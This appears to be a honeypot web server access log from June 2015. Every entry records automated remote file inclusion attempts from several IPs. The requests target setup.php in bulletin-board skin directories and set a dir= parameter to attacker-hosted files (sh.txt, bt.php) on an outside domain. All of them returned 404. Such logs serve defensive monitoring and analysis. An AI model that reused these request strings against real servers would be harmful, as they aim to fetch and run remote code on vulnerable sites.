112.218.68.155 - - [28/Jun/2015:17:51:25 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:51:26 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:51:27 -0700] "POST /honeypot/BSidesDFW%20-%202014.ipynb//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:51:28 -0700] "POST /honeypot/BSidesDFW%20-%202014.ipynb//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:51:29 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:51:30 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:51:31 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:51:32 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:51:33 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:51:34 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:51:35 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:17:51:36 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
82.98.160.235 - - [28/Jun/2015:17:51:36 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:17:51:38 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:17:51:38 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:17:51:39 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:17:51:39 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:17:51:40 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:17:51:41 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:17:51:42 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
180.179.212.237 - - [28/Jun/2015:17:51:42 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
82.98.160.235 - - [28/Jun/2015:17:51:42 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:17:51:43 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:17:51:43 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
180.179.212.237 - - [28/Jun/2015:17:51:44 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
82.98.160.235 - - [28/Jun/2015:17:51:45 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
180.179.212.237 - - [28/Jun/2015:17:51:54 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:51:59 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
180.179.212.237 - - [28/Jun/2015:17:52:00 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:52:01 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:52:02 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:52:05 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
74.208.16.118 - - [28/Jun/2015:17:52:06 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
74.208.16.118 - - [28/Jun/2015:17:52:07 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
74.208.16.118 - - [28/Jun/2015:17:52:07 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
180.179.212.237 - - [28/Jun/2015:17:52:07 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
74.208.16.118 - - [28/Jun/2015:17:52:08 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" 
180.179.212.237 - - [28/Jun/2015:17:52:11 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
180.179.212.237 - - [28/Jun/2015:17:52:14 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:52:17 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
180.179.212.237 - - [28/Jun/2015:17:52:18 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
180.179.212.237 - - [28/Jun/2015:17:52:19 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
180.179.212.237 - - [28/Jun/2015:17:52:19 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:52:20 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
180.179.212.237 - - [28/Jun/2015:17:52:21 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:52:21 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
180.179.212.237 - - [28/Jun/2015:17:52:22 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
180.179.212.237 - - [28/Jun/2015:17:52:26 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:52:28 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:52:28 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Chrome/28.0.1468.0" 
180.179.212.237 - - [28/Jun/2015:17:52:28 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:52:33 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:52:35 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:52:40 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:52:40 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:52:46 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:52:47 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:52:53 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:52:54 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:52:55 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:52:56 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
74.208.180.80 - - [28/Jun/2015:17:52:57 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:17:52:58 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:17:52:58 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:17:52:59 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
180.179.212.237 - - [28/Jun/2015:17:53:02 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:03 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:09 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:23 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:53:23 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:53:25 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:53:25 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
180.179.212.237 - - [28/Jun/2015:17:53:26 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:53:27 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:53:27 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
180.179.212.237 - - [28/Jun/2015:17:53:28 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:28 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:53:29 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
180.179.212.237 - - [28/Jun/2015:17:53:29 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:53:29 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
180.179.212.237 - - [28/Jun/2015:17:53:29 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:17:53:30 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:53:31 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:53:32 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:53:33 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
112.218.68.155 - - [28/Jun/2015:17:53:34 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
180.179.212.237 - - [28/Jun/2015:17:53:35 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:35 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:36 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:36 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:42 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:42 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:43 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:43 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:48 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:50 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:50 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:17:53:54 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
